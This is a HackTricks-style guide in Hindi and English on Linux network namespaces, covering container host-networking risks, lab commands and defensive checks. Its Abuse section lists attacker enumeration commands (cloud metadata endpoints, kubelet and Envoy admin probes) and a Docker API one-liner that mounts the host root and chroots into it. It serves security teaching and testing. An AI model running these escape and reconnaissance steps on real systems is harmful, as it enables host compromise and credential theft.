# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

Network namespace interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, UNIX-domain abstract socket namespace और `/proc/net` जैसी files की contents जैसे network-related resources को isolate करता है। इसी कारण container के पास अपना `eth0`, अपनी local routes और अपना loopback device दिखाई दे सकता है, जबकि उसके पास host का वास्तविक network stack नहीं होता।

Security के दृष्टिकोण से यह महत्वपूर्ण है, क्योंकि network isolation केवल port binding तक सीमित नहीं है। एक private network namespace यह सीमित करता है कि workload सीधे क्या observe या reconfigure कर सकता है। एक बार वह namespace host के साथ share हो जाए, तो container को host listeners, host-local services, abstract AF_UNIX endpoints और उन network control points की visibility अचानक मिल सकती है, जिन्हें application के सामने कभी expose करने का उद्देश्य नहीं था।

## Operation

नया बनाया गया network namespace interfaces attach किए जाने तक एक empty या लगभग empty network environment से शुरू होता है। इसके बाद container runtimes virtual interfaces create या connect करते हैं, addresses assign करते हैं और routes configure करते हैं, ताकि workload को अपेक्षित connectivity मिल सके। Bridge-based deployments में आमतौर पर इसका अर्थ होता है कि container को host bridge से connected एक veth-backed interface दिखाई देता है। Kubernetes में CNI plugins Pod networking के लिए इसी तरह का setup संभालते हैं।

यह architecture बताता है कि `--network=host` या `hostNetwork: true` इतना बड़ा बदलाव क्यों है। एक तैयार private network stack प्राप्त करने के बजाय, workload सीधे host के वास्तविक network stack में शामिल हो जाता है।

## Lab

आप लगभग empty network namespace को इस command से देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप सामान्य और host-networked containers की तुलना इससे कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-networked container के पास अब अपना अलग socket और interface view नहीं है। यह बदलाव अपने-आप में पहले से ही महत्वपूर्ण है, इससे पहले कि आप यह पूछें कि process के पास कौन-सी capabilities हैं।

## Runtime Usage

Docker और Podman सामान्यतः प्रत्येक container के लिए एक private network namespace बनाते हैं, जब तक कि उन्हें अन्यथा configure न किया गया हो। Kubernetes आमतौर पर प्रत्येक Pod को अपना network namespace देता है, जिसे उस Pod के अंदर मौजूद containers साझा करते हैं, लेकिन जो host से अलग होता है। इसका अर्थ है कि `127.0.0.1` सामान्यतः container-local के बजाय Pod-local होता है: केवल localhost पर bound listener आमतौर पर उसके sidecars और siblings से reachable होता है। Incus/LXC systems भी network-namespace आधारित समृद्ध isolation प्रदान करते हैं, जिनमें virtual networking setups की अधिक विविधता होती है।

सामान्य principle यह है कि private networking default isolation boundary है, जबकि host networking उस boundary से explicit opt-out है।

## Misconfigurations

सबसे महत्वपूर्ण misconfiguration केवल host network namespace को share करना है। यह कभी-कभी performance, low-level monitoring या convenience के लिए किया जाता है, लेकिन इससे containers के लिए उपलब्ध सबसे स्पष्ट boundaries में से एक हट जाती है। Host-local listeners अधिक direct तरीके से reachable हो जाते हैं, केवल localhost पर उपलब्ध services accessible हो सकती हैं, और `CAP_NET_ADMIN` या `CAP_NET_RAW` जैसी capabilities कहीं अधिक dangerous बन जाती हैं, क्योंकि इनके द्वारा enabled operations अब host के अपने network environment पर लागू होते हैं।

एक अन्य समस्या network namespace के private होने पर भी network-related capabilities को जरूरत से अधिक grant करना है। Private namespace सहायता करता है, लेकिन इससे raw sockets या advanced network control harmless नहीं बन जाते।

Kubernetes में `hostNetwork: true` यह भी बदलता है कि Pod-level network segmentation पर आप कितना भरोसा कर सकते हैं। Kubernetes के documentation के अनुसार, कई network plugins `podSelector` / `namespaceSelector` matching के लिए `hostNetwork` Pod traffic को ठीक से distinguish नहीं कर सकते और इसलिए इसे ordinary node traffic मानते हैं। Attacker के दृष्टिकोण से, इसका अर्थ है कि compromised `hostNetwork` workload को अक्सर एक normal Pod के रूप में नहीं, बल्कि node-level network foothold के रूप में treat किया जाना चाहिए, जो overlay-network workloads जैसी ही policy assumptions से constrained हो।

## Abuse

कमजोर रूप से isolated setups में attackers host listening services का निरीक्षण कर सकते हैं, केवल loopback पर bound management endpoints तक पहुंच सकते हैं, exact capabilities और environment के आधार पर traffic को sniff या interfere कर सकते हैं, या यदि `CAP_NET_ADMIN` मौजूद हो तो routing और firewall state को reconfigure कर सकते हैं। Cluster में, इससे lateral movement और control-plane reconnaissance भी आसान हो सकती है।

यदि आपको host networking का संदेह है, तो पहले यह confirm करें कि दिखाई देने वाले interfaces और listeners isolated container network के बजाय host से संबंधित हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
केवल Loopback पर चलने वाली services अक्सर पहली दिलचस्प खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets एक ऐसा target हैं जिन्हें आसानी से नज़रअंदाज़ किया जा सकता है, क्योंकि वे network-namespace scoped होते हैं, भले ही वे TCP/UDP listeners जैसे न दिखें और `/run` के अंतर्गत filesystem paths के रूप में मौजूद भी न हों। इसलिए host-networked container को उन host-only control channels तक access विरासत में मिल सकता है जिन्हें container में bind-mounted किया ही नहीं गया था:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
एक ऐतिहासिक उदाहरण `containerd-shim` abstract-socket exposure bug था, लेकिन व्यापक सीख विशिष्ट CVE से अधिक महत्वपूर्ण है: जब कोई workload host network namespace में शामिल हो जाता है, तो abstract AF_UNIX services भी attack surface का हिस्सा बन जाती हैं। यदि वे sockets runtime-related या administrative दिखाई दें, तो [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) पर pivot करें।

यदि network capabilities मौजूद हों, तो जाँचें कि क्या workload visible stack का निरीक्षण या उसमें बदलाव कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
आधुनिक kernels पर, host networking और `CAP_NET_ADMIN` केवल साधारण `iptables` / `nftables` बदलावों से आगे packet path को भी expose कर सकते हैं। `tc` qdiscs और filters भी namespace-scoped होते हैं, इसलिए shared host network namespace में वे उन host interfaces पर लागू होते हैं जिन्हें container देख सकता है। यदि `CAP_BPF` भी मौजूद हो, तो TC और XDP loaders जैसे network-related eBPF programs भी प्रासंगिक हो जाते हैं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि attacker host interface level पर traffic को mirror, redirect, shape या drop करने में सक्षम हो सकता है, केवल firewall rules को rewrite करने तक सीमित नहीं। Private network namespace में ये actions container view तक सीमित रहते हैं; shared host namespace में इनका प्रभाव host पर पड़ता है।

Cluster या cloud environments में, host networking metadata और control-plane-adjacent services की quick local recon को भी उचित ठहराता है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes में याद रखें कि multi-container Pod में **किसी भी** container से compromise होने पर sibling containers और sidecars द्वारा खोले गए localhost listeners तक भी access मिल जाता है, क्योंकि पूरा Pod एक ही network namespace share करता है। यह service-mesh, observability और helper containers के लिए विशेष रूप से relevant हो जाता है, जिनके admin या debug interfaces cluster-wide के बजाय जानबूझकर केवल Pod-internal होते हैं:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
“bound to localhost” को **Pod-private** समझें, **container-private** नहीं। Pod में एक container के compromise होने के बाद यह assumption समाप्त हो जाती है।

### Full Example: Host Networking + Local Runtime / Kubelet Access

Host networking अपने-आप host root प्रदान नहीं करता, लेकिन यह अक्सर उन services को expose कर देता है जिन्हें केवल node से ही intentionally reachable बनाया गया होता है। यदि इनमें से कोई service कमजोर रूप से protected है, तो host networking privilege-escalation का direct path बन जाता है।

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost पर Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- यदि कोई local runtime API उचित protection के बिना exposed है, तो direct host compromise
- यदि kubelet या local agents तक पहुंच संभव है, तो cluster reconnaissance या lateral movement
- `CAP_NET_ADMIN` के साथ combined होने पर traffic manipulation या denial of service

## Checks

इन checks का लक्ष्य यह पता लगाना है कि process के पास private network stack है या नहीं, कौन-से routes और listeners दिखाई दे रहे हैं, और capabilities test करने से पहले ही network view host-like दिखता है या नहीं।
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
यहां क्या महत्वपूर्ण है:

- यदि `/proc/self/ns/net` और `/proc/1/ns/net` पहले से ही host जैसे दिखाई देते हैं, तो container संभवतः host network namespace या किसी अन्य non-private namespace को share कर रहा है।
- `lsns -t net` और `ip netns identify` तब उपयोगी होते हैं, जब shell पहले से ही किसी named या persistent namespace के अंदर हो और आप उसे host side से `/run/netns` objects के साथ correlate करना चाहते हों।
- `ss -lntup` विशेष रूप से महत्वपूर्ण है, क्योंकि यह केवल loopback पर सुनने वाले listeners और local management endpoints को दिखाता है। `ss -xap` और `/proc/net/unix` abstract-socket view भी उपलब्ध कराते हैं, जिसे सामान्य filesystem socket hunts में नहीं देखा जाता।
- यदि `CAP_NET_ADMIN`, `CAP_NET_RAW` या `CAP_BPF` मौजूद हो, तो routes, interface names, firewall context, `tc` state और eBPF attachments अधिक महत्वपूर्ण हो जाते हैं।
- Kubernetes में, `hostNetwork` Pod से service-name resolution विफल होना केवल इस कारण हो सकता है कि Pod `dnsPolicy: ClusterFirstWithHostNet` का उपयोग नहीं कर रहा है; इसका अर्थ यह नहीं है कि service मौजूद नहीं है।
- Multi-container Pods में localhost listeners पूरे Pod network namespace से संबंधित होते हैं, इसलिए यह मानने से पहले कि loopback-only port compromised container से unreachable है, sidecars और sibling containers की जांच करें।

किसी container की समीक्षा करते समय, network namespace का मूल्यांकन हमेशा capability set के साथ करें। Strong network capabilities वाली host networking, narrow default capability set वाली bridge networking से बिल्कुल अलग security posture होती है।

## References

- [Kubernetes NetworkPolicy और `hostNetwork` से जुड़ी caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` और abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network containers के सामने exposed abstract Unix domain sockets](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Network-related eBPF programs के लिए eBPF token और capability requirements](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
